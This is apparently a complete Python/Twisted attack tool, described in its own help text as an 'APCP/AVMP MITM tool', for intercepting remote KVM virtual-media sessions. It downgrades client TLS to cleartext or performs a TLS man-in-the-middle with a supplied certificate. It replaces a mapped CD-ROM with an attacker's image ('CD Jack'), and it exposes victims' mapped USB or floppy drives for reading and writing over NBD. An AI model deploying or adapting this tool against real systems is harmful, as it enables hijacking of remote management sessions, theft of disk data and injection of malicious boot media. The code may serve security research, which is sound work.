#!/usr/bin/python

from twisted.internet import protocol, ssl, reactor, endpoints, defer
from twisted.python import log
from OpenSSL import SSL
from zope.interface import implements

import os

from utils import hexdump, RODict
from avctproto import AvctProtocol
import avctpacket
import nbdserver


class AvctProxy(AvctProtocol):
	"""A base class for proxying APCP/AVMP messages"""

	# OVERRIDE interceptMessages, don't modify!
	interceptMessages = RODict()

	ready = False

	def messageReceived(self, packet):
		handler = self.interceptMessages.get(
			(packet.proto, packet.messageType),
			debugProxy
		)
		handler(self, packet)

	def connectionLost(self, reason):
		log.msg("%s: connection lost (%s). Disconnecting peer." % (
			self.logPrefix(), str(reason)
		))
		if self.peer.transport is not None:
			self.peer.transport.loseConnection()
		# Clear possible circular refs
		self.peer = None
		self.factory = None

	def logPrefix(self):
		if isinstance(self.factory, AvctProxyServerFactory):
			return "AVCTProxyServer"
		elif isinstance(self.factory, AvctProxyClientFactory):
			return "AVCTProxyClient"
		else:
			return "AvctProxyUnknownRole"

	def passthroughData(self, data):
		log.msg("[passthrough]:\n" + hexdump(data))
		self.peer.transport.write(data)


def silentProxy(p, packet):
	p.peer.sendMessage(packet)


def debugProxy(p, packet):
	if packet.proto in ('APCP', 'AVMP'):
		log.msg("Proxying " + packet.display())
	p.peer.sendMessage(packet)


class AvctProxyServerFactory(protocol.Factory):
	protocol = AvctProxy

	def __init__(self, clientFactory, clientEndpoint, sessionJacker, driveJacker):
		self.clientFactory = clientFactory
		self.clientEndpoint = clientEndpoint
		self.sessionJacker = sessionJacker
		self.driveJacker = driveJacker
		self.sessionNumber = 0

	def buildProtocol(self, addr):
		p = self.protocol()
		p.factory = self
		p.sessionNumber = self.sessionNumber
		self.sessionNumber += 1
		d = self.clientEndpoint.connect(self.clientFactory)
		d.addCallback(self.clientConnected, p)
		d.addErrback(self.clientConnectFailed, p)
		return p

	def clientConnected(self, clientp, p):
		log.msg("Connected to KVM server")
		p.peer = clientp
		clientp.peer = p
		p.ready = True
		clientp.ready = True
		clientp.sessionNumber = p.sessionNumber

		p.interceptMessages = {
			("AVMP", 0x0210): self.driveJacker.mapCD,
			("AVMP", 0x0211): self.driveJacker.mapDisk,
			("AVMP", 0x0220): self.driveJacker.unmapDrive,
			("AVMP", 0x0300): self.driveJacker.readResponse,
			("AVMP", 0x0400): silentProxy,
			("AVMP", 0x0410): self.driveJacker.clientStatus,
		}

		clientp.interceptMessages = {
			("APCP", 0x8100): self.sessionJacker.sessionSetup,
			("AVMP", 0x8200): self.driveJacker.diskInfo,
			("AVMP", 0x8300): self.driveJacker.readRequest,
		}

		# Flush the buffer
		p.dataReceived('')
		clientp.dataReceived('')

	def clientConnectFailed(self, reason, p):
		log.err(reason)
		p.transport.loseConnection()


class AvctProxyClientFactory(protocol.Factory):
	protocol = AvctProxy


class ClientCtxFactory(ssl.ClientContextFactory):
	method = SSL.TLSv1_METHOD

	def __init__(self, trustedCerts):
		self.trustedCerts = trustedCerts

	def getContext(self):
		ctx = ssl.ClientContextFactory.getContext(self)
		if self.trustedCerts is not None:
			ctx.load_verify_locations(self.trustedCerts)
		return ctx


def ServerCtxFactory(serverkey, servercert):
	if serverkey is None and servercert is None:
		log.msg("Server key and/or server cert not supplied. TLS MiTM disabled")
		return None
	return ssl.DefaultOpenSSLContextFactory(
		serverkey, servercert,
		sslmethod=SSL.TLSv1_METHOD)


class SessionJacker(object):
	def __init__(self, trustedcerts, serverkey, servercert, attemptDowngrade):
		self.clientCtxFactory = ClientCtxFactory(trustedcerts)
		self.serverCtxFactory = ServerCtxFactory(serverkey, servercert)
		self.attemptDowngrade = attemptDowngrade

	def sessionSetup(self, p, packet):
		log.msg("Received " + packet.display())
		if packet.capabilities == 4:  # 4 == TLS
			if self.attemptDowngrade:
				log.msg("TLS Client downgrade initiated")
				p.transport.startTLS(self.clientCtxFactory)
				packet.capabilities = 1
				p.peer.sendMessage(packet)
			elif self.serverCtxFactory is not None:
				log.msg("TLS MiTM initiated")
				p.transport.startTLS(self.clientCtxFactory)
				p.peer.sendMessage(packet)
				p.peer.transport.startTLS(self.serverCtxFactory)
			else:
				log.msg("TLS passthrough initiated")
				p.peer.sendMessage(packet)
				p.enterPassthrough()
				p.peer.enterPassthrough()
		else:
			log.msg("Cleartext session in progress")
			p.peer.sendMessage(packet)


def _nbdReady(_):
	log.msg("NBD Server ready for connections")


def _nbdListenFailed(reason):
	log.err(reason)


def nbdexportname(p, driveIndex):
	return "S%dD%d" % (p.sessionNumber, driveIndex)


class DriveJacker(object):
	def __init__(self, cdromfp, doNbd, nbdEndpoint):
		self.cdromfp = cdromfp
		self.cdromIndices = set()
		self.nbdExports = {}
		self.doNbd = doNbd
		self.cachedDiskInfo = None

		if doNbd:
			f = nbdserver.NBDServerFactory(self.nbdExports)
			d = nbdEndpoint.listen(f)
			d.addCallback(_nbdReady)
			d.addErrback(_nbdListenFailed)

	# CDROM Jacking
	def mapCD(self, p, packet):
		if self.cdromfp is None:
			log.msg("CD Jack disabled, proxying " + packet.display())
		else:
			log.msg("Original request: " + packet.display())
			s = os.fstat(self.cdromfp.fileno())
			packet.numblocks = s.st_size // 2048
			packet.blocksize = 2048
			log.msg("Modified request: " + packet.display())
			self.cdromIndices.add(packet.driveIndex)
			log.msg("Jacked CD mapping")
		p.peer.sendMessage(packet)

	def unmapDrive(self, p, packet):
		exportname = nbdexportname(p, packet.driveIndex)
		if packet.driveIndex in self.cdromIndices:
			log.msg("Unjacked drive")
			self.cdromIndices.remove(packet.driveIndex)
			p.peer.sendMessage(packet)
		elif exportname in self.nbdExports:
			self.nbdExports[exportname].size = 0
			del self.nbdExports[exportname]
			if self.cachedDiskInfo is not None:
				self.cachedDiskInfo.items[packet.driveIndex].status = 0
				log.msg("Sending cached " + self.cachedDiskInfo.display())
				p.sendMessage(self.cachedDiskInfo)
			status = avctpacket.ClientStatus(packet.driveIndex, 0)
			log.msg("Sending our own " + status.display())
			p.sendMessage(status)
		else:
			debugProxy(p, packet)

	def readRequest(self, p, packet):
		log.msg("Received " + packet.display())

		if packet.driveIndex not in self.cdromIndices:
			p.peer.sendMessage(packet)
			return

		offset = packet.firstBlock
		numBlocks = packet.numBlocks
		while numBlocks > 0:
			i = min(numBlocks, packet.blockFactor)
			self.cdromfp.seek(offset * 2048)
			data = self.cdromfp.read(i * 2048)
			response = avctpacket.ReadResponse(
				packet.driveIndex,
				offset, i, data
			)
			log.msg("Sending our own " + response.display())
			p.sendMessage(response)
			offset += i
			numBlocks -= i
		status = avctpacket.ClientStatus(packet.driveIndex, 0)
		log.msg("Sending our own " + status.display())
		p.sendMessage(status)


	# USB/Floppy Jacking
	def mapDisk(self, p, packet):
		if not self.doNbd:
			return debugProxy(p, packet)
		exportName = nbdexportname(p, packet.driveIndex)
		self.nbdExports[exportName] = NBDExport(p, packet)
		log.msg("Exported drive as " + exportName)

		if self.cachedDiskInfo is not None:
			self.cachedDiskInfo.items[packet.driveIndex].status = 1
			log.msg("Sending cached " + self.cachedDiskInfo.display())
			p.sendMessage(self.cachedDiskInfo)

		status = avctpacket.DeviceStatus(packet.driveIndex, 0)
		log.msg("Sending " + status.display())
		p.sendMessage(status)

	def readResponse(self, p, packet):
		exportName = nbdexportname(p, packet.driveIndex)
		if exportName not in self.nbdExports:
			return debugProxy(p, packet)
		self.nbdExports[exportName].processReadResponse(packet)

	def clientStatus(self, p, packet):
		exportName = nbdexportname(p, packet.driveIndex)
		if exportName not in self.nbdExports:
			return debugProxy(p, packet)
		self.nbdExports[exportName].processClientStatus(packet)

	def diskInfo(self, p, packet):
		for i in range(len(packet.items)):
			exportName = nbdexportname(p, i)
			if exportName in self.nbdExports:
				packet.items[i].status = 1
		self.cachedDiskInfo = packet
		debugProxy(p, packet)


class NBDExport(object):
	implements(nbdserver.IBlockDevice)

	def __init__(self, proto, packet):
		self.proto = proto
		self.driveIndex = packet.driveIndex
		self.blocksize = packet.blocksize
		self.size = self.blocksize * packet.numblocks
		self.flags = 1
		if packet.readonly:
			self.flags |= 2

		self.requestQueue = []  # AVMP is synchronous only.
		self.request = None
		self.defer = None
		self.readbuf = ''

	def processQueue(self):
		if self.request is not None or len(self.requestQueue) == 0:
			return
		(self.request, self.defer) = self.requestQueue.pop(0)
		self.proto.sendMessage(self.request)

	def read(self, offset, length):
		if offset % self.blocksize != 0:
			raise IOError("Requests must be block-aligned")
		if length % self.blocksize != 0:
			raise IOError("Requests must be block-sized")
		if offset + length > self.size:
			raise IOError("Attempt to read beyond end of device")

		packet = avctpacket.ReadRequest(
			self.driveIndex,
			offset // self.blocksize,
			length // self.blocksize,
			16384 // self.blocksize
		)
		d = defer.Deferred()
		self.requestQueue.append((packet, d))
		self.processQueue()
		return d

	def write(self, offset, data):
		if offset % self.blocksize != 0:
			raise ValueError("Requests must be block-aligned")
		if len(data) % self.blocksize != 0:
			raise ValueError("Requests must be block-sized")
		packet = avctpacket.WriteRequest(
			self.driveIndex,
			offset // self.blocksize,
			len(data) // self.blocksize,
			data
		)
		d = defer.Deferred()
		self.requestQueue.append((packet, d))
		self.processQueue()
		return d

	def processReadResponse(self, packet):
		self.readbuf += packet.data

	def processClientStatus(self, packet):
		if self.defer is None:
			raise ValueError("Received unsolicied " + packet.display())

		if isinstance(self.request, avctpacket.ReadRequest):
			self.defer.callback(self.readbuf)
			self.readbuf = ''
		else:
			self.defer.callback(None)
		self.request = None
		self.defer = None
		self.processQueue()


def main():
	import sys
	import argparse

	def serverType(x):
		if isinstance(x, str):
			return endpoints.serverFromString(reactor, x)
		else:
			return x

	def clientType(x):
		if isinstance(x, str):
			return endpoints.clientFromString(reactor, x)
		else:
			return x

	def serverListening(listeningPort):
		log.msg("AvctProxy listenining on " + str(listeningPort.getHost()))

	def serverListenFailed(reason):
		if hasattr(reason, 'socketError'):
			log.err(reason.socketError)
		else:
			log.err(reason)
		reactor.stop()

	parser = argparse.ArgumentParser(description='APCP/AVMP MITM tool')
	parser.add_argument(
		'--listen', help='Listen address/port in Twisted enpoint syntax',
		type=serverType, default='tcp:2068')
	parser.add_argument(
		'--target', help='Address of target server (Twisted enpoint syntax)',
		type=clientType, required=True)
	parser.add_argument(
		'--trustedcerts',
		help='File with trusted TLS certificate(s) - to prevent MiTM of us',
		default=None)
	parser.add_argument(
		'--servercert', help='File containing the server certificate for MiTM',
		default=None)
	parser.add_argument(
		'--serverkey', help='File containing the server private key for MiTM',
		default=None)
	parser.add_argument(
		'--downgrade', help='Attempt to downgrade client connections to cleartext',
		action='store_true')
	parser.add_argument(
		'--debug', help='Print verbose logs to stderr',
		action='store_true')
	parser.add_argument(
		'--nbd', help='Export disks and floppys as an NBD device',
		action='store_true')
	parser.add_argument(
		'--nbdlisten', type=serverType, default='tcp:10809:interface=127.0.0.1',
		help='Listen address/port for NBD in Twisted endpoint syntax')
	parser.add_argument(
		'--cdrom', help='Replace any mapped cdrom with the provided file',
		type=argparse.FileType(mode='rb'), default=None)
	args = parser.parse_args()

	if args.debug:
		log.startLogging(sys.stderr)

	sessionJacker = SessionJacker(
		args.trustedcerts, args.serverkey,
		args.servercert, args.downgrade)

	driveJacker = DriveJacker(args.cdrom, args.nbd, args.nbdlisten)

	clientFactory = AvctProxyClientFactory()
	serverFactory = AvctProxyServerFactory(
		clientFactory, args.target, sessionJacker, driveJacker
	)

	d = args.listen.listen(serverFactory)
	d.addCallback(serverListening)
	d.addErrback(serverListenFailed)

	reactor.run()

if __name__ == "__main__":
	main()
